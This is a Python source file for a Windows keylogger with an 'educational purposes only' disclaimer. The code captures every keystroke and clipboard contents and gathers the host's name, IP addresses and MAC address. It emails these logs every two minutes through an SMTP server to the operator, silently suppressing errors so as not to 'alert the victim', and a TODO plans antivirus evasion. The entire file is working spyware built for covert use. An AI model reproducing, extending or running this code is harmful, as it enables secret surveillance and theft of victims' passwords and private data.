# Keylogger

# DISCLAIMER.
# TO BE USED FOR EDUCATIONAL PURPOSES ONLY.
# This tool can and should only be used with written consent of the owner of the system it is being run on.
# Using this tool for any other use is ILLEGAL.
# The developer assumes NO liability and is NOT RESPONSIBLE for any damage caused by this tool.
# Any and all responsibility lies with the end-user.



# TODO
# 1. Hide sysinfo and log.
# 2. Make it undetectable to most antivirus scanners

# Imports
from pynput.keyboard import Key, Listener
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import win32clipboard
import re, uuid
import smtplib
import socket
import platform
import requests
from threading import Thread
import time
import os

#Filenames and Constants
SYSINFO = ".sysinfo.txt"
LOG = ".log.txt"
TOTAL = 40
EMAIL_INTERVAL = 2  # In minutes

# Email address and password
# Have to enable SMTP in gmx, gmail from other apps
emailAddr = ""
passwd = ""

# Shutdown flag to let threads know when to quit
# Debugging purposes. Unless adding self-destruction.
shutdown = False

# Keys logged
keys = []

# Dict to replace special keys to a more readable format in logs
spcl_keys = {"Key.space": "[SPACE]", "Key.up": "[UP]", "Key.down": "[DOWN]", "Key.left": "[LEFT]", "Key.right": "[RIGHT]",
            "Key.tab": "[TAB]", "Key.shift_r": "[SHIFT-R]", "Key.shift_l": "[SHIFT-L]", "Key.shift": "[SHIFT]", 
            "Key.scroll_lock": "[SCROLL_LOCK]", "Key.print_screen": "[PRNT_SCR]", "Key.num_lock": "[NUM_LOCK]",
            "Key.enter": "[RETURN]", "Key.delete": "[DELETE]", "Key.ctrl_r": "[CTRL-R]", "Key.ctrl_l": "[CTRL-L]", 
            "Key.ctrl": "[CTRL]", "Key.cmd": "[CMD/SUPER]", "Key.cmd_r": "[CMD/SUPER-R]", "Key.cmd_l": "[CMD/SUPER-L]",
            "Key.caps_lock": "[CAPS]", "Key.backspace": "[BACK]", "Key.alt_r": "[ALT-R]", "Key.alt_l": "[ALT-L]",
            "Key.alt": "[ALT]", "Key.alt_gr": "[ALT-GR]"}


# Write keys to log file
def writeToLog():
    with open(LOG, 'a') as fp:
        for key in keys:
            if str(key).find("Key") > 0:
                fp.write(" " + key + " ")
            else:
                fp.write(key)


# Get key pressed, store in keys
# Write to log if max keys reached
def on_press(key):
    global keys
    temp = str(key).replace("'", "")

    if temp == "Key.enter" or key == "Key.space":
        temp = '\n'
    elif temp == "\\x03":
        writeToLog()
        keys.clear()
        copyClipboard()

    try:
        keys.append(spcl_keys[temp])
    except KeyError:
         keys.append(temp)

    if (len(keys) == TOTAL):
        writeToLog()
        keys.clear()


# When pressed esc, quit
# Only used for debugging purposes
def on_release(key):
    # Used for debugging purposes
    # Wouldn't want to exit unless it is a
    # self-destructing keylogger
    global shutdown
    if key == Key.esc:
        shutdown = True
        err = True
        if os.path.exists(LOG):
            while err:
                try:
                    os.remove(LOG)
                    err = False
                except:
                    err = True
        if os.path.exists(SYSINFO):
            while err:
                try:
                    os.remove(SYSINFO)
                    err = False
                except:
                    err = True

        return False

    pass


# Copies clipboard and writes to log
def copyClipboard():
    try:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        with open(LOG, 'a') as f:
            f.write("\n Clipboard: \n ")
            f.write(data + "\n")
            f.close()
    except:
        with open(LOG, 'a') as f:
            f.write("\n Error copying clipboard\n")


# Sends log and sysinfo via email
# Sends email every 10 minutes
def sendEmail():
    while not shutdown:
        time.sleep(EMAIL_INTERVAL * 60)
        try:
            msg = MIMEMultipart()

            msg['From'] = emailAddr
            msg['To'] = emailAddr
            msg['Subject'] = "Log file"

            body = ""
            msg.attach(MIMEText(body, 'plain'))

            attachment = open(LOG, "rb")
            p = MIMEBase('application', 'octet-stream')
            p.set_payload(attachment.read())
            encoders.encode_base64(p)
            p.add_header('Content-Disposition', "attachment; filename= %s" % LOG)
            msg.attach(p)

            attachment = open(SYSINFO, "rb")
            p = MIMEBase('application', 'octet-stream')
            p.set_payload(attachment.read())
            encoders.encode_base64(p)
            p.add_header('Content-Disposition', "attachment; filename= %s" % SYSINFO)
            msg.attach(p)

            s = smtplib.SMTP('mail.gmx.com', 587)
            s.starttls()
            s.login(emailAddr, passwd)

            text = msg.as_string()

            s.sendmail(emailAddr, emailAddr, text)

            s.quit()
        except:
            # Nothing to do. Don't want to alert the victim.
            pass 


# Get system information and write to a file
# for sending via email
def getSysInfo():
    hostname = socket.gethostname()
    ip = socket.gethostbyname(hostname)

    procInfo = platform.processor()
    sys = platform.system()
    version = platform.version()
    machine = platform.machine()
    publicIP = requests.get("https://api.ipify.org").text
    mac_addr = ':'.join(re.findall('..', '%012x' % uuid.getnode()))

    toWrite = "Hostname: " + hostname + "\nIP: " + ip + "\nProcessor: " + procInfo +\
        "\nSystem Information: " + sys + "\nVersion: " + version + "\nMachine: " + machine +\
        "\nPublic IP: " + publicIP + "\n" + "MAC: " + mac_addr

    with open(SYSINFO, 'a') as f:
        f.write(toWrite)


    


# Main execution sequence
if __name__ == "__main__":
    getSysInfo()
    # Start keylogger
    emailThread = Thread(target=sendEmail,daemon=True)
    emailThread.start()

    with Listener(on_press=on_press,on_release=on_release) as listener:
        listener.join()

        



